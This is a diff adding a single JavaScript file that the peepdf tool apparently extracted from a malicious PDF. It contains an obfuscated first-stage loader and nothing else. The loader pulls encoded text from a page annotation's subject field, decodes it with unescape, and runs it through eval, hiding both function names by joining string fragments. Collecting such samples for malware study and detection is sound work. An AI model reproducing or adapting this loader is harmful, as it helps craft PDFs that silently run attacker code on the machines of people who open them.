@@ -1,0 +1,26 @@
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+var sum = '';
+var esadfg = "";
+var pr = null;
+var num = 1;
+var fnk = 'e';
+var er = "esca";
+var they = 0;
+app.doc.syncAnnotScan();
+if (!(app.plugIns.length < 0)) {
+    var rte = '%'
+    sum = app.doc.getAnnots({
+        nPage: 0
+    })[num].subject;
+    they = this
+    num = 0;
+}
+if (app.plugIns.length > 0) {
+    var afdfar = sum.split('xyz');
+    var gfdhre = they['un' + er + 'pe'];
+    for (var n = 0; n < afdfar.length - 1; n++) esadfg += gfdhre(rte + afdfar[n + 1]);
+    fnk = '';
+    they['ev' + fnk + "a" + "l"](esadfg);
+}
+
